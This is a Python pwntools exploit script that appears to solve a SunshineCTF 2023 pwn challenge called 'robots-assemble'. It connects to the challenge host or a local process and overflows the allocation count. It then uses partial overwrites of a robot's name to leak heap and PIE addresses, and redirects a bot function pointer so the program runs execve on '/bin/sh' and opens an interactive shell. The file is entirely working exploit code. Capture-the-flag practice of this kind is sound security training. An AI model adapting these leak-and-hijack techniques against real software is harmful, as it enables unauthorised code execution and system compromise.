#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "chal.2023.sunshinectf.games"
PORT =  23000
PROCESS = "./robots-assemble"


def setrobot(name, iq, selfaware, evil, timer):
    r.recvline()
    r.send(name)
    r.recvline()
    r.sendline(str(iq))
    r.recvline()
    r.sendline("y" if selfaware else "n")
    r.recvline()
    r.sendline("y" if evil else "n")
    r.recvline()
    r.sendline(str(timer))
    
def finish_bot_input():
    r.sendline()
    r.recvline()
    r.sendline("1")
    r.recvline()
    r.sendline("y")
    r.recvline()
    r.sendline("y")
    r.sendline(str(9999999))
    r.recvuntil("Name?\n")

def exploit(r):
    r.recvline()
    r.sendline(str(0xffffffffffffffff/0x30))

    setrobot("/bin/sh\x00\n", 100, True, True, 40*1000*1000)
    setrobot("A"*10, 100, True, True, 40*1000*1000)
    setrobot("\n", 0, False, False, 2*1000*1000)
    setrobot("\n", 0, False, False, 4*1000*1000)

    r.recvuntil("Name?\n")

    # partial overwrite bot name to leak heap address
    r.send(p8(0x90))

    HEAPLEAK = u64(r.recvuntil(":", drop=True).ljust(8, "\x00"))
    log.info("HEAP leak       : %s" % hex(HEAPLEAK))

    finish_bot_input()

    # partial overwrite bot name to leak elf address
    PIETARGET = HEAPLEAK + 0x28 
    r.send(p16(PIETARGET & 0xffff))

    PIELEAK = u64(r.recvuntil(":", drop=True).ljust(8, "\x00"))
    e.address = PIELEAK - 0x19c0

    log.info("PIE leak        : %s" % hex(PIELEAK))
    log.info("ELF             : %s" % hex(e.address))
    finish_bot_input()

    # partial overwrite bot function to execute execve(botname)
    WATTARGET = e.address + 0x1e42
    log.info("WAT target      : %s" % hex(WATTARGET))

    payload = p64(HEAPLEAK - 0x100) + p16(WATTARGET & 0xffff)
    
    r.send(payload)
    
    log.info("Wait for bot to die to trigger shell")
    time.sleep(9)

    r.interactive()

    return


if __name__ == "__main__":
    e = ELF("./robots-assemble")

    if len(sys.argv) > 1:
        LOCAL = False
        r = remote(HOST, PORT)
    else:
        LOCAL = True
        r = process("./robots-assemble")
        print(util.proc.pidof(r))
        pause()

    exploit(r)
